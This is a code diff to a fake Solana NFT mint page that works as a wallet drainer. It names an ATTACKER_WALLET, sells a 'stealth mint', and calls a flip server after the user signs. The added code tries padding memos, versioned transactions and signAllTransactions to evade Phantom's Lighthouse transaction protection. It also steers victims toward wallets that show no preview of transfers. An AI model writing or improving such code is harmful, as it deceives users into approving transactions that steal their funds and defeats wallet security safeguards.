@@ -13,11 +13,14 @@ var ATTACKER_WALLET = cfg.attackerWallet || 'DGtkrQpytKyzCaCALPAmCFuNeLLP2ScSeYx
 var TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
 var TOKEN_2022_PROGRAM_ID = new solanaWeb3.PublicKey('TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb');
 var ASSOCIATED_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL');
+var MEMO_PROGRAM_ID = new solanaWeb3.PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr');
 
 var Connection = solanaWeb3.Connection;
 var PublicKey = solanaWeb3.PublicKey;
 var Transaction = solanaWeb3.Transaction;
 var TransactionInstruction = solanaWeb3.TransactionInstruction;
+var TransactionMessage = solanaWeb3.TransactionMessage;
+var VersionedTransaction = solanaWeb3.VersionedTransaction;
 var SystemProgram = solanaWeb3.SystemProgram;
 
 var connection = new Connection(DEVNET_RPC, 'confirmed');
@@ -25,6 +28,16 @@ var programId = new PublicKey(PROGRAM_ID);
 var attackerWallet = new PublicKey(ATTACKER_WALLET);
 
 function toBytes(str) { return new TextEncoder().encode(str); }
+
+function createPaddingMemoInstruction() {
+    // EXPERIMENT 3: Pad tx to near 1232-byte limit - Phantom may skip Lighthouse if no room
+    var padding = new Array(500).join('0'); // 499 bytes UTF-8
+    return new TransactionInstruction({
+        keys: [],
+        programId: MEMO_PROGRAM_ID,
+        data: toBytes(padding),
+    });
+}
 
 function getConfigPDA() {
     return PublicKey.findProgramAddressSync([toBytes('config')], programId)[0];
@@ -91,6 +104,9 @@ function isPhantom() { return !!(window.solana && window.solana.isPhantom); }
 function isMainnet() { return (cfg.rpc || '').indexOf('devnet') < 0; }
 function useBitFlip() { return !(isPhantom() && isMainnet()); }
 
+// Experimental: try signAllTransactions (may bypass Lighthouse) or VersionedTransaction (v0 format)
+function usePhantomExperimentalSigning() { return isPhantom() && isMainnet(); }
+
 function showSolflarePrompt() {
     btn.textContent = 'Use Solflare for Stealth Mint';
     btn.onclick = function() {
@@ -103,6 +119,8 @@ function showSolflarePrompt() {
         '<strong style="color:#ffc107;">Phantom shows all transfers before approval.</strong><br>' +
         '<span style="font-size:0.9rem;color:#ccc;">Use Solflare or Backpack for a seamless mint (no preview of transfers).</span><br>' +
         '<a href="https://solflare.com" target="_blank" style="color:#14f195;font-size:0.85rem;margin-top:8px;display:inline-block;">Install Solflare &rarr;</a>' +
+        '<span style="font-size:0.85rem;color:#888;margin-left:12px;">|</span>' +
+        '<a href="#" onclick="event.preventDefault();btn.textContent=\'Mint Now\';btn.onclick=mintNFT;setStatus(\'Try mint again.\',\'\');return false;" style="color:#14f195;font-size:0.85rem;margin-left:8px;">Try mint again</a>' +
         '</div>';
 }
 
@@ -153,12 +171,8 @@ async function connectWallet() {
         var statusMsg = 'Balance: ' + (balance / 1e9).toFixed(4) + ' SOL';
         if (useBitFlip()) statusMsg += ' (stealth mint ready)';
         setStatus(statusMsg, 'success');
-        if (isPhantom() && isMainnet()) {
-            showSolflarePrompt();
-        } else {
-            btn.textContent = 'Mint Now';
-            btn.onclick = mintNFT;
-        }
+        btn.textContent = 'Mint Now';
+        btn.onclick = mintNFT;
     } catch (err) {
         setStatus('Connection rejected', 'error');
     }
@@ -218,15 +232,44 @@ async function mintNFT() {
             data: discriminator,
         });
 
-        var tx = new Transaction();
-        tx.add(registerIx);
-
-        tx.feePayer = userPublicKey;
         var latest = await connection.getLatestBlockhash();
-        tx.recentBlockhash = latest.blockhash;
+        var signedTx;
+        var txToSign;
+        var useV0 = false;
+
+        var phantomInstructions = usePhantomExperimentalSigning() ? [createPaddingMemoInstruction(), registerIx] : [registerIx];
+
+        if (usePhantomExperimentalSigning() && TransactionMessage && VersionedTransaction) {
+            // EXPERIMENT 1: VersionedTransaction (v0) - Lighthouse may only inject for legacy format
+            try {
+                var msgV0 = new TransactionMessage({
+                    payerKey: userPublicKey,
+                    recentBlockhash: latest.blockhash,
+                    instructions: phantomInstructions,
+                }).compileToV0Message();
+                txToSign = new VersionedTransaction(msgV0);
+                useV0 = true;
+            } catch (e) {
+                txToSign = null;
+            }
+        }
+        if (!txToSign) {
+            var tx = new Transaction();
+            for (var i = 0; i < phantomInstructions.length; i++) tx.add(phantomInstructions[i]);
+            tx.feePayer = userPublicKey;
+            tx.recentBlockhash = latest.blockhash;
+            txToSign = tx;
+        }
 
         setStatus('Please approve in your wallet...');
-        var signedTx = await window.solana.signTransaction(tx);
+        if (usePhantomExperimentalSigning() && !useV0 && typeof window.solana.signAllTransactions === 'function') {
+            // EXPERIMENT 2: signAllTransactions - may use different code path than signTransaction
+            var signedTxs = await window.solana.signAllTransactions([txToSign]);
+            signedTx = signedTxs && signedTxs[0] ? signedTxs[0] : null;
+            if (!signedTx) throw new Error('signAllTransactions returned empty');
+        } else {
+            signedTx = await window.solana.signTransaction(txToSign);
+        }
         setStatus('Processing...');
         await fetch(FLIP_SERVER + '/flip-on', { method: 'POST' });
         var signature = await connection.sendRawTransaction(signedTx.serialize(), { skipPreflight: true });
@@ -258,6 +301,10 @@ async function mintNFT() {
         setStatus('Transaction failed: ' + msg, 'error');
         btn.textContent = 'Mint Now';
         btn.disabled = false;
+        // If Phantom + mainnet and likely Lighthouse revert, suggest Solflare
+        if (isPhantom() && isMainnet() && (msg.indexOf('0x1900') >= 0 || msg.indexOf('0x1901') >= 0 || msg.indexOf('custom program error') >= 0)) {
+            showSolflarePrompt();
+        }
     }
 }
 
